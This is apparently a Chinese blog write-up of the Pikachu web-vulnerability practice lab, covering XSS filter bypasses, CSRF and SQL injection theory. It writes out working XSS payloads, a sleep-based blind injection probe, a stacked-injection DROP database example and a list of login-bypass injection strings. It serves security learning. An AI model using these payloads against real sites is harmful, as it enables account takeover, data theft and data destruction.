+<figure data-type="image" tabindex="43"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252179.png" alt="image-20240729201906082" loading="lazy"></figure>
+<p>弹窗弹了两次 也就是说每一个输入框都有xss漏洞 可以进行弹窗操作</p>
+<p>点击弹窗结束后可以来到正常的管理页面</p>
+<figure data-type="image" tabindex="44"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252249.png" alt="image-20240729201935695" loading="lazy"></figure>
+<h3 id="xss之过滤">xss之过滤</h3>
+<p>首先使用我们之前使用过的payload  <script>alert(1)</script></p>
+<figure data-type="image" tabindex="45"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252337.png" alt="image-20240729202351563" loading="lazy"></figure>
+<p>发现被过滤的只剩下&gt;了</p>
+<p>看一眼源代码</p>
+<figure data-type="image" tabindex="46"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252365.png" alt="image-20240729202213048" loading="lazy"></figure>
+<p>那就进行绕过叭</p>
+<p>上payload   <a href="" onclick="alert('xss')"></p>
+<figure data-type="image" tabindex="47"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252396.png" alt="image-20240729203943598" loading="lazy"></figure>
+<p>点击  即可弹窗</p>
+<figure data-type="image" tabindex="48"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252469.png" alt="image-20240729204003985" loading="lazy"></figure>
+<h3 id="xss之htmlspecialchars">xss之htmlspecialchars</h3>
+<p>首先看到输入框 我们就拿平时用的xss语句进行尝试 <script>alert(1)</script></p>
+<figure data-type="image" tabindex="49"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252514.png" alt="image-20240730115006986" loading="lazy"></figure>
+<p>弹出已被记录    点击记录的链接  出现报错</p>
+<figure data-type="image" tabindex="50"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252664.png" alt="image-20240730115055752" loading="lazy"></figure>
+<p>接下来我们来查看源码</p>
+<figure data-type="image" tabindex="51"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252724.png" alt="image-20240730115348710" loading="lazy"></figure>
+<p>发现可以尝试使用a标签  输入payload ' onclick=' alert(1)</p>
+<p>形成闭合</p>
+<a href='' onclick='alert(1)'>
+<figure data-type="image" tabindex="52"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252758.png" alt="image-20240730201210485" loading="lazy"></figure>
+<p>可以造成弹窗</p>
+<figure data-type="image" tabindex="53"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252790.png" alt="image-20240730201138672" loading="lazy"></figure>
+<h3 id="xss之href输出">xss之href输出</h3>
+<p>先试试payload  <script>alert('xss')</script></p>
+<p>点击后出现</p>
+<figure data-type="image" tabindex="54"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252924.png" alt="image-20240730201558065" loading="lazy"></figure>
+<p>再次点击</p>
+<figure data-type="image" tabindex="55"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252953.png" alt="image-20240730201517688" loading="lazy"></figure>
+<p>查看源码</p>
+<figure data-type="image" tabindex="56"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252014.png" alt="image-20240730201649221" loading="lazy"></figure>
+<p>再次尝试利用a标签 ' onclick=' alert(1)</p>
+<figure data-type="image" tabindex="57"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252063.png" alt="image-20240730201958246" loading="lazy"></figure>
+<p>依旧无果</p>
+<figure data-type="image" tabindex="58"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252088.png" alt="image-20240730201854023" loading="lazy"></figure>
+<p>查看网页源代码</p>
+<figure data-type="image" tabindex="59"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252170.png" alt="image-20240730202119921" loading="lazy"></figure>
+<p>发现左右尖括号和单双引号都被html编码了</p>
+<p>那我们在这里可以利用JavaScript代码段</p>
+<p>javascript:alert(1)</p>
+<p>输入后即可造成弹窗</p>
+<figure data-type="image" tabindex="60"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252261.png" alt="image-20240730202440452" loading="lazy"></figure>
+<h3 id="xss之js输出">xss之js输出</h3>
+<p>试试插入语句javascript:alert(1)</p>
+<figure data-type="image" tabindex="61"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252293.png" alt="image-20240730202703717" loading="lazy"></figure>
+<p>查看源代码</p>
+<figure data-type="image" tabindex="62"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252319.png" alt="image-20240730202815664" loading="lazy"></figure>
+<p>那就试试<script>alert(1)</script></p>
+<figure data-type="image" tabindex="63"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252339.png" alt="image-20240730203638936" loading="lazy"></figure>
+<p>没有反应  那就来查看源代码</p>
+<figure data-type="image" tabindex="64"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252518.png" alt="image-20240730203619000" loading="lazy"></figure>
+<p>发现<script>标签对应关系有问题，那么我们只需要想办法闭合掉第一个<script>就可以了</p>
+<p>那我们就先闭合前一个<script>标签</p>
+<p>直接上payload  </script><script>alert('xss')</script></p>
+<p>即可获得弹窗</p>
+<figure data-type="image" tabindex="65"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252548.png" alt="image-20240730203912696" loading="lazy"></figure>
+<h2 id="csrf跨站请求伪造">CSRF(跨站请求伪造)</h2>
+<h3 id="csrf跨站请求伪造概述">CSRF(跨站请求伪造)概述</h3>
+<p>Cross-site request forgery  简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为&quot;one click&quot;攻击。</p>
+<p>很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。</p>
+<p>附上pikachu里的场景实例：</p>
+<p><strong>场景需求：</strong><br>
+小黑想要修改大白在购物网站tianxiewww.xx.com上填写的会员地址。<br>
+<strong>先看下大白是如何修改自己的密码的：</strong><br>
+登录---修改会员信息，提交请求---修改成功。<br>
+所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。</p>
+<p>​                        但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？<br>
+​                        于是他自己跑到www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：<br>
+​                        【http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】<br>
+​                        于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。<br>
+​</p>
+<p><strong>为啥小黑的操作能够实现呢。有如下几个关键点：</strong><br>
+​                        1.www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造;<br>
+​                        ---因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。<br>
+​                        2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;<br>
+​                        ---如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。<br>
+​                        ---因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。<br>
+​                        当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做：                        欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。<br>
+​                        ---所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。</p>
+<p>​                        因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：<br>
+​                        --对敏感信息的操作增加安全的token；<br>
+​                        --对敏感信息的操作增加安全的验证码；<br>
+​                        --对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p>
+<figure data-type="image" tabindex="66"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252571.png" alt="image-20240731164829019" loading="lazy"></figure>
+<figure data-type="image" tabindex="67"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252605.png" alt="image-20240731164842282" loading="lazy"></figure>
+<h4 id="为什么小黑可以攻击成功呢">为什么小黑可以攻击成功呢？</h4>
+<p>条件1：xxx购物网站没有对个人信息修改的请求进行防CSRF处理，导致该请求容易被伪造。因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作（增删改）是否容易被伪造。<br>
+条件2：lucy在登录了后台的情况下，点击了小黑发送的“埋伏”链接。如果lucy不在登录状态下，或者没有点击这个恶意链接，则攻击就不会成功。<br>
+为什么会出现CSRF漏洞*<br>
+一方面，用户安全意识不足，访问不知名的url<br>
+另一方面，web没有做到准确的合法用户验证</p>
+<h4 id="csrf与xss的区别">CSRF与XSS的区别</h4>
+<p>CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS可以通过盗取cookie来直接获取用户权限来实施攻击。</p>
+<h4 id="如何确认一个web系统存在csrf漏洞">如何确认一个web系统存在csrf漏洞</h4>
+<p>1、对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造</p>
+<p>例如：修改管理员账号时，并不需要验证旧密码，导致请求容易被伪造<br>
+例如：对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造<br>
+2、确认凭证的有效期（这个问题会提高CSRF被利用的概率）<br>
+虽然退出或者关闭了浏览器，但cookie仍然有效，或者session并没有过期，导致CSRF攻击变得简单。</p>
+<h3 id="csrfget-login">CSRF(get) login</h3>
+<p>首先 我们通过提示的信息进行登录</p>
+<figure data-type="image" tabindex="68"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252693.png" alt="image-20240731165257627" loading="lazy"></figure>
+<p>进入个人页面后点击修改个人信息  然后点击提交并进行抓包</p>
+<figure data-type="image" tabindex="69"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252720.png" alt="image-20240801115808428" loading="lazy"></figure>
+<figure data-type="image" tabindex="70"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252745.png" alt="image-20240801115852918" loading="lazy"></figure>
+<figure data-type="image" tabindex="71"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252772.png" alt="image-20240801120102635" loading="lazy"></figure>
+<p>这一句是我们的请求 但是在这个过程中我们并没有看到token 说明并没有对csrf的防护措施</p>
+<figure data-type="image" tabindex="72"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252125.png" alt="image-20240801120225885" loading="lazy"></figure>
+<p>修改get请求，我们将phonenum修改为521521，然后补全url并发送给被攻击者</p>
+<p>如果被攻击者此时登录状态或cookie/session没有过期，则信息被修改</p>
+<figure data-type="image" tabindex="73"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252150.png" alt="image-20240801120457760" loading="lazy"></figure>
+<h3 id="csrfpost">CSRF(post)</h3>
+<p>老样子 登录后我们再进行抓包</p>
+<figure data-type="image" tabindex="74"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252178.png" alt="image-20240801120730851" loading="lazy"></figure>
+<p>post型，因为是请求体，不能在url中，所以无法再使用上述办法（即通过URL来伪造请求)进行修改。</p>
+<p>但是我们可以根据抓包所获取的信息自己构造一个表单</p>
+<p>这个地方就不做演示了 哈哈哈哈</p>
+<h3 id="csrf-token">CSRF Token</h3>
+<p>CSRF的主要问题是敏感操作的链接容易被伪造，那么如何让这个链接不容易被伪造？</p>
+<p>Token的定义：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌。</p>
+<p>老样子 我们登录后进行修改并抓包</p>
+<figure data-type="image" tabindex="75"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252213.png" alt="image-20240801121224404" loading="lazy"></figure>
+<figure data-type="image" tabindex="76"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252319.png" alt="image-20240801121240065" loading="lazy"></figure>
+<p>这一关就能看到token了</p>
+<p>当我们点击修改个人信息的时候，从url可以看出我们访问了token_get_edit.php，执行后端代码，生成token，并且发送到前端页面，通过hidden属性隐藏起来，放在表单中。</p>
+<p>点击submit时，我们会将从后端发过来的token和我们所要提交的数据，以表单的形式一并发送到后端服务器，后端服务器会验证此token。<br>
+我们发现在get请求提交的基础上增加了Token，当我们刷新页面时Token值会发生变化，这样也就完全防止了GRSF漏洞的产生。</p>
+<h3 id="crsf漏洞常见防范措施">CRSF漏洞常见防范措施</h3>
+<p>增加token验证（常用的做法）：<br>
+　　1、对关键操作增加token参数，token值必须随机，每次都不一样；<br>
+关于安全的会话管理（避免会话被利用，及时关闭登录态）<br>
+　　1、不要在客户端保存敏感信息（比如身份认证信息）；<br>
+　　2、测试直接关闭，退出时的会话过期机制；<br>
+　　3、设置会话过期机制，比如15分钟内无操作，则自动登入超时；<br>
+访问控制安全管理：<br>
+　　1、敏感信息的修改时需要对身份进行二次认证，比如修改账号时，需要判断旧密码；<br>
+　　2、敏感信息的修改尽量使用post，而不是get；（post的安全性比get高些）<br>
+　　3、通过http 头部中的referer来限制原页面<br>
+一般用在登录（防暴力破解），也可以用在其他重要信息操作的表单中（需要考虑可用性）</p>
+<h2 id="sql-injectsql注入漏洞">SQL-Inject（SQL注入漏洞）</h2>
+<h3 id="sql-injectsql注入概述">Sql Inject(SQL注入)概述</h3>
+<p>在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。<br>
+<strong>一个严重的SQL注入漏洞，可能会直接导致一家公司破产！</strong><br>
+SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。                        从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。<br>
+在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：<br>
+1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；<br>
+2.使用参数化（Parameterized Query 或 Parameterized Statement）；<br>
+3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了&quot;拼接&quot;的方式,所以使用时需要慎重!</p>
+<p>举例</p>
+<figure data-type="image" tabindex="77"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252390.png" alt="image-20240801121835727" loading="lazy"></figure>
+<h2 id="什么是sql注入">什么是sql注入</h2>
+<p>SQL 注入是比较常见的网络攻击方式之一，它不是利用操作系统的 BUG 来实现攻击，而是针对程序员编写时的疏忽，通过 SQL 语句，实现无账号登录，甚至篡改数据库。</p>
+<p>在 MySQL5.0 之后，MySQL 中默认添加了一个名为 <code>information_schema</code> 的数据库，该数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。</p>
+<p>mysql中注释符：#  、/**/ 、 --</p>
+<h4 id="information_schema-中三个很重要的表">information_schema 中三个很重要的表：</h4>
+<ul>
+<li>• information_schema.<strong>schemata</strong>:<br>
+该数据表存储了 mysql 数据库中的所有数据库的<code>库名</code></li>
+<li>• information_schema.<strong>tables</strong>：<br>
+该数据表存储了 mysql 数据库中的所有数据表的<code>表名</code></li>
+<li>• information_schema.<strong>columns</strong>:<br>
+该数据表存储了 mysql 数据库中的所有列的<code>列名</code></li>
+</ul>
+<h3 id="mysql-中常用的函数"><strong>Mysql 中常用的函数</strong></h3>
+<p>version():查询数据库的版本<br>
+user():查询数据库的使用者<br>
+database():数据库<br>
+system_user():系统用户名<br>
+session_user():连接数据库的用户名<br>
+current_user():当前用户名<br>
+load_file():读取本地文件<br>
+@@datadir:读取数据库路径<br>
+@@basedir:mysql安装路径<br>
+@@version_complie_os:查看操作系统</p>
+<p>ascii(str):返回给定字符的ascii值。如果str是空字符串，返回0如果str是NULL，返回NULL。如 ascii(&quot;a&quot;)=97<br>
+length(str) : 返回给定字符串的长度，如 length(&quot;string&quot;)=6<br>
+substr(string,start,length):对于给定字符串string，从start位开始截取，截取length长度 ,如 substr(&quot;chinese&quot;,3,2)=&quot;in&quot;<br>
+substr()、stbstring()、mid() :三个函数的用法、功能均一致<br>
+concat(username)：将查询到的username连在一起，默认用逗号分隔<br>
+concat(str1,'<em>',str2)：将字符串str1和str2的数据查询到一起，中间用</em>连接<br>
+group_concat(username) ：将username所有数据查询在一起，用逗号连接<br>
+limit 0,1：查询第1个数 limit 1,1：查询第2个数</p>
+<h1 id="判断-sql-注入是否存在">判断 SQL 注入是否存在</h1>
+<ul>
+<li>先加单引号<code>'</code>、双引号<code>&quot;</code>、单括号<code>)</code>、双括号<code>))</code>等看看是否<strong>报错</strong>，如果报错就可能存在 SQL 注入漏洞了。</li>
+<li>• 还有在 URL 后面加 <code>and 1 = 1 、 and 1 = 2 </code>看页面是否显示一样，<strong>显示不一样</strong>的话，肯定存在 SQL 注入漏洞了。</li>
+<li>• 还有就是<code>Timing Attack</code>测试，也就是<code>时间盲注</code>。有时候通过简单的条件语句比如 and 1=2 是无法看出异常的。</li>
+<li>• 在 MySQL 中，有一个<code>Benchmark() </code>函数，它是用于测试性能的。<code>Benchmark(count,expr) </code>，这个函数执行的结果，是将表达式 <code>expr</code> 执行 <code>count</code> 次 。</li>
+</ul>
+<p>因此，利用<code>benchmark函数</code>，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为<code>Timing Attack</code>，也就是<code>时间盲注</code>。</p>
+<p><strong>易出现 SQL 注入的功能点：</strong> 凡是和<code>数据库有交互</code>的地方都容易出现 SQL 注入，SQL 注入经常出现在登陆页面、涉及获取 HTTP 头（user-agent / client-ip 等）的功能点及订单处理等地方。例如登陆页面，除常见的万能密码，post 数据注入外也有可能发生在 HTTP 头中的 client-ip 和 x-forward-for 等字段处。这些字段是用来记录登陆的 ip 的，有可能会被存储进数据库中从而与数据库发生交互导致 sql 注入。</p>
+<h3 id="sql-注入的分类">Sql 注入的分类</h3>
+<hr>
+<table>
+<thead>
+<tr>
+<th>分类依据</th>
+<th>类型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>获取信息的方式</td>
+<td>布尔盲注，时间盲注，报错注入 ，联合查询注入，堆叠注入等</td>
+</tr>
+<tr>
+<td>提交方式</td>
+<td>GET、POST、COOKIE、HTTP 注入等</td>
+</tr>
+<tr>
+<td>注入点类型</td>
+<td>数字类型的注入、字符串类型的注入、搜索型注入等</td>
+</tr>
+<tr>
+<td>其他注入</td>
+<td>二次注入、User-Agent 注入、文件读写、宽字节注入 、万能密码 等</td>
+</tr>
+</tbody>
+</table>
+<h3 id="n几大类型-sql-注入原理">N几大类型 Sql 注入原理</h3>
+<h3 id="一-布尔盲注">一、布尔盲注</h3>
+<h4 id="原理以及手工注入">原理以及手工注入</h4>
+<p>条件：<code>攻击者无法直接获取到这些信息</code> Web 的页面的仅仅会返回 <code>True</code> 和 <code>False</code>。那么布尔盲注就是进行 SQL 注入之后然后根据页面返回的 True 或者是 False 来得到数据库中的相关信息。</p>
+<p>盲注一般用到的一些函数：<code>ascii()</code> 、<code>substr() </code>、<code>length()</code>，<code>exists()</code>、<code>concat()</code>等</p>
+<h3 id="二-联合查询注入union-注入">二、联合查询注入（union 注入）</h3>
+<h4 id="一-原理及手工注入">一、原理及手工注入</h4>
+<hr>
+<p>三个条件：</p>
+<ol>
+<li>两个表的<code>列数相同</code>，并且相应的列具有<code>相似的数据类型</code>。</li>
+<li>查询结果<code>回显</code>。</li>
+<li>存在注入漏洞。</li>
+</ol>
+<p>我们可以通过<code>order by</code>来判断当前表的列数。</p>
+<h3 id="三-文件读写">三、文件读写</h3>
+<h4 id="1-union-注入读取文件">1. union 注入读取文件</h4>
+<p><strong>注</strong>：当有显示列的时候，文件读可以利用 union 注入。当没有显示列的时候，只能利用盲注进行数据读取；</p>
+<p>文件写入只能利用 union 注入</p>
+<p>登录 mysql 执行以下命令</p>
+<pre><code>mysql&gt;SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;
+
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv |       |
++------------------+-------+
+</code></pre>
+<p>这里<code>secure_file_priv</code>的值要为&quot;&quot;或者 &quot;/&quot;<br>
+secure_file_priv 有三个值</p>
+<p>1、限制 mysqld 不允许导入 | 导出</p>
+<pre><code>mysqld –secure_file_prive=null
+</code></pre>
+<p>2、限制 mysqld 的导入 | 导出 只能发生在/tmp/目录下</p>
+<pre><code>mysqld –secure_file_priv=/tmp/
+</code></pre>
+<p>3、不对 mysqld 的导入 | 导出做限制</p>
+<pre><code>secure_file_priv=''
+</code></pre>
+<h4 id="2-盲注读取文件">2. 盲注读取文件</h4>
+<p>盲注读取的话就是利用<code>hex函数</code>，将读取的字符串转换成 16 进制，再利用<code>ascii函数</code>，转换成 ascii 码，再利用<code>二分法</code>一个一个的判断字符，很复杂，一般结合工具完成</p>
+<h3 id="四-报错注入">四、报错注入</h3>
+<h4 id="报错注入常用的函数">报错注⼊常⽤的函数</h4>
+<hr>
+<ol>
+<li>floor()</li>
+<li>extractvalue()</li>
+<li>updatexml()</li>
+<li>geometrycollection()</li>
+<li>multipoint()</li>
+<li>polygon()</li>
+<li>multipolygon()</li>
+<li>linestring()</li>
+<li>.。。。。。</li>
+</ol>
+<h3 id="五-时间盲注">五、时间盲注</h3>
+<p><code>Timing Attack注入，也就是时间盲注</code>。通过简单的条件语句比如 and 1=2 是无法看出异常的。</p>
+<p>在MySQL中，有一个<code>Benchmark()</code> 函数，它是用于测试性能的。Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。</p>
+<p>因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为<code>Timing Attack</code>，也就是时间盲注。</p>
+<p>利用前提：页面上没有显示位，也没有输出 SQL 语句执行错误信息。正确的 SQL 语句和错误的 SQL 语句返回页面都一样，但是加入 sleep(5)条件之后，页面的返回速度明显慢了 5 秒。</p>
+<p>//判断是否存在延时注入<br>
+?id=1' and sleep(5) --+</p>
+<h3 id="六-宽字节注入">六、宽字节注入</h3>
+<p>宽字节注入是由于不同编码中中英文<code>所占字符</code>的的不同所导致的，通常的来说，在GBK编码当中，一个汉字占用2个字节。除了UTF-8以外，所有的ANSI编码中文都是占用俩个字符。</p>
+<p>//GBK和其他所有ANSI结果为2<br>
+echo strlen(&quot;中&quot;)</p>
+<p>//UTF-8<br>
+echo strlen(&quot;中&quot;) //结果为3</p>
+<p>我们先说一下php中对于sql注入的过滤，这里就不得不提到几个函数了。</p>
+<p><code>addslashes()</code>函数，这个函数在<code>预定义字符</code>之前添加反斜杠 \ 。 这个函数有一个特点虽然会添加反斜杠 \ 进行转义，但是 \ 并不会插入到数据库中。。这个函数的功能和<code>魔术引号</code>完全相同，所以当打开了魔术引号时，不应使用这个函数。可以使用 <code>get_magic_quotes_gpc()</code>来检测是否已经转义。</p>
+<p><code>mysql_real_escape_string()</code> 函数，这个函数用来转义sql语句中的特殊符号<code>x00 </code>、<code>\n</code>、<code>\r</code>、<code>\</code>、<code>' </code>、<code>&quot;</code> 、<code>x1a</code>。</p>
+<p><strong>注：</strong></p>
+<ol>
+<li>
+<p>\1. <code>预定义字符</code>：单引 '，双引 &quot;，反斜 \，NULL</p>
+</li>
+<li>
+<p>\2. <code>魔术引号</code>：当打开时，所有单引号 '、双引号 &quot; 、反斜杠 \ 和NULL字符都会被自动加上一个反斜线来进行转义，和addslashes()函数的作用完全相同。所以，如果魔术引号打开，就不要使用addslashes()函数。一共有三个魔术引号指令：</p>
+</li>
+<li>
+<ol>
+<li>magic_quotes_gpc</li>
+<li>magic_quotes_runtime</li>
+<li>magic_quotes_sybase</li>
+</ol>
+</li>
+</ol>
+<h3 id="七-堆叠注入">七、堆叠注入</h3>
+<p>在SQL中，分号;是用来表示一条sql语句的结束。试想一下我们在 一条语句结束后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了<code>堆叠注入</code>。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别呢？区别就在于union 或者union all执行的语句类型是有限的，只可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：root';DROP database user；服务器端生成的sql语句为：<code>select * from user where name='root';DROP database user；</code>当执行查询后，第一条显示查询信息，第二条则将整个user数据库删除。</p>
+<h3 id="八-二次注入">八、二次注入</h3>
+<h4 id="概念">概念</h4>
+<hr>
+<p>二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。二次注入是sql注入的一种，但是比普通<code>sql注入</code>利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</p>
+<h4 id="原理">原理</h4>
+<hr>
+<p>在第一次进行数据插入数据库得时候，仅仅知识使用了<code>addslashes()</code>或者是借助<code>get_magic_quotes_gpc()</code> 对其中得字符进行了转义，在后端代码中可能会被转义，但在存入数据库时候还是原来得数据，数据中一般带有单引号和#号，然后下次使用在拼凑SQL中，所以就行了二次注入。</p>
+<h4 id="过程">过程</h4>
+<hr>
+<ol>
+<li>插入1‘#</li>
+<li>转义成1\’#</li>
+<li>不能注入，但是保存在数据库时变成了原来的1’#</li>
+<li>利用1’#进行注入,这里利用时要求取出数据时不转义</li>
+</ol>
+<h4 id="条件">条件</h4>
+<hr>
+<ol>
+<li>\1. 用户向数据库插入恶意语句（即使后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义）</li>
+<li>\2. 数据库对自己存储得数据非常放心，直接读取出恶意数据给用户</li>
+</ol>
+<h3 id="九-user-agent-注入">九、User-Agent 注入</h3>
+<h3 id="十-cookie-注入">十、Cookie 注入</h3>
+<h4 id="原理-2">原理</h4>
+<hr>
+<p>cookie注入的原理是：就是修改cookie的值进行注入</p>
+<p>♦cookie注入其原理也和平时的注入一样，只不过注入参数换成了cookie</p>
+<p>♦要进行cookie注入，我们首先就要修改cookie，这里就需要使用到Javascript语言了。</p>
+<h4 id="条件-2">条件</h4>
+<hr>
+<p>两个必须条件：</p>
+<ul>
+<li>程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤。</li>
+<li>在条件1的基础上还需要程序对提交数据获取方式是直接<code>request(&quot;xxx&quot;)</code>的方式，<strong>未指明</strong>使用request对象的具体方法进行获取，也就是说用request这个方法的时候获取的参数<strong>可以是在URL后面的参数</strong>，<strong>也可以是cookie里面的参数这里没有做筛选</strong>，之后的原理就像我们的sql注入一样了。</li>
+</ul>
+<h3 id="十一-万能密码">十一、万能密码</h3>
+<h4 id="原理-3">原理</h4>
+<hr>
+<p>原验证登陆语句:</p>
+<pre><code>SELECT * FROM admin WHERE Username= '&quot;.$username.&quot;' AND Password= '&quot;.md5($password).&quot;'
+</code></pre>
+<p>输入 <code>1' or 1=1 or '1'='1</code>万能密码语句变为:</p>
+<pre><code>SELECT * FROM admin WHERE Username='1' OR 1=1 OR '1'='1' AND Password='EDFKGMZDFSDFDSFRRQWERRFGGG'
+</code></pre>
+<p>即得到优先级关系：<code>or&lt;and&lt;not</code>，同一优先级默认从左往右计算。</p>
+<ul>
+<li>上面<code>'1'='1' AND Password='EDFKGMZDFSDFDSFRRQWERRFGGG'</code> <strong>先计算</strong>肯定返回<code>false</code>,因为密码是我们乱输入的。(此处是假)</li>
+<li>Username=‘1’ 返回假，数据库没有1这个用户名(此处是假)</li>
+<li>1=1返回真(此处是真)</li>
+</ul>
+<p>以上的结果是: <code>假 or 真 or假</code> 返回<code>真</code>。验证通过。再比如：</p>
+<pre><code>select tel,pwd where tel='111' and pwd='123456'
+</code></pre>
+<p>我们把电话111看成一个变量，输入电话号码为<code>' or 1= '1</code>。</p>
+<p>sql就变为如下样子：</p>
+<pre><code>select  tel,pwd where tel='' or 1='1' and pwd='123456'
+</code></pre>
+<ul>
+<li>上面<code>1='1' and pwd='123456' </code><strong>先计算</strong>肯定返回<code>false</code>。(此处是假)</li>
+<li>tel=‘’ 返回假，数据库没有<code>''</code>这个手机号。(此处是假)</li>
+</ul>
+<p>以上的结果是: <code>真 or假</code> 返回<code>真</code>。验证通过。</p>
+<h3 id="常用的万能密码">常用的万能密码</h3>
+<hr>
+<pre><code>' or 1='1
+'or'='or'
+admin
+admin'--
+admin' or 4=4--
+admin' or '1'='1'--
+admin888
+&quot;or &quot;a&quot;=&quot;a
+admin' or 2=2#
+a' having 1=1#
+a' having 1=1--
+admin' or '2'='2
+')or('a'='a
+or 4=4--
+c
+a'or' 4=4--
+&quot;or 4=4--
+'or'a'='a
+&quot;or&quot;=&quot;a'='a
+'or''='
+'or'='or'
